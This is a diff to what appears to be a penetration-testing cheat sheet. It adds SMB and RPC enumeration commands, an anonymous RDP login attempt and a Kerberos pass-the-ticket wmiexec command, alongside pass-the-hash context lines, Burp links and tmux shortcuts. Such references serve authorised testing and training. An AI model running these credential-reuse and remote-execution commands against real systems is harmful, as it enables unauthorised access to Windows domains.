@@ -134,6 +134,9 @@ $ netshareenumall
 $ srvinfo
 $ queryuser 500
 $ querydispinfo
+$ enumdomains
+$ enumprivs
+
 ```
 
 ### Port 139,445 (SMB)
@@ -181,6 +184,7 @@ $ crackmapexec smb 10.10.10.10 -u 'nik' -H hash_uniq.txt
 $ enum4linux 10.10.10.10
 $ enum4linux -u "user" -p "password" -a 10.10.10.10
 $ for i in $(cat list.txt); do enum4linux -a $i;done
+
 
 => References
 $ https://ubuntu.com/tutorials/install-and-configure-samba
@@ -343,6 +347,7 @@ $ nmap -p 3389 --script=rdp-vuln-* 10.10.10.10
 $ xfreerdp /u:nik /p:'Password@123!' /cert:ignore /v:10.10.10.10
 $ xfreerdp /u:admin /p:password /cert:ignore /v:10.10.10.10 /drive:share_mount,/opt/folder_to_mount
 $ rdesktop -a 16 -z -u admin -p password 10.10.10.10
+$ rdesktop -f -u "" 10.10.10.10
 
 => References
 $ https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/
@@ -1809,8 +1814,10 @@ $ getST.py -spn MSSQL/DC01.BANK.LOCAL 'BANK.LOCAL/nik' -impersonate Administrato
 $ getTGT.py -dc-ip 10.10.10.10 bank.local/nik:'Passw0rd@123!'
 
 => wmiexec.py
+$ export KRB5CCNAME=Administrator.ccache;
 $ wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0405e42853c0f2cb0454964601f27bae administrator@10.10.10.10
 $ wmiexec.py -hashes :0405e42853c0f2cb0454964601f27bae administrator@10.10.10.10
+$ wmiexec.py bank.local/Administrator@DC.bank.local -k -no-pass
 
 => psexec.py
 $ export KRB5CCNAME=Administrator.ccache;
@@ -1937,6 +1944,14 @@ cat README.md | sed 's/\!\[\[Pasted image /\!\[\]\(https\:\/\/github.com\/H0j3n\
 # References
 - https://gist.github.com/lanmaster53/3d868369d0ba5144b215921d4e11b052
 - https://github.com/PortSwigger/python-scripter
+```
+
+### Burpsuite 
+
+```bash
+=> Extensions List
+$ https://github.com/snoopysecurity/awesome-burp-extensions#xxe
+$ https://portswigger.net/solutions/penetration-testing/penetration-testing-tools
 ```
 
 ### CTI Lexicon
@@ -2807,13 +2822,47 @@ getmyuid
 
 ```
 
-### Tmux
+### Tmux Commands
 
 ```bash
-# Commands
+=> Start new session
+$ tmux new -s newsession
 
-# References
+=> Split Pane Vertically
+$ Ctrl + b + "
+
+=> Split Pane Horizontally
+$ Ctrl + b + %
+
+=> List session
+$ tmux ls
+
+=> Attach to last session
+$ tmux a
+
+=> Attach to specific session
+$ tmux a -t newsession
+
+=> Toogle Pane Zoom
+$ Ctrl + b + z
+
+=> Create new window
+$ Ctrl + b + c
+
+=> Next Windows
+$ Ctrl + b + n
+
+=> 
+
+=> References
 https://tmuxcheatsheet.com/
+```
+
+### Vim Commands
+
+```bash
+=> References
+$ https://vim.rtorr.com/
 ```
 
 ### Firebird
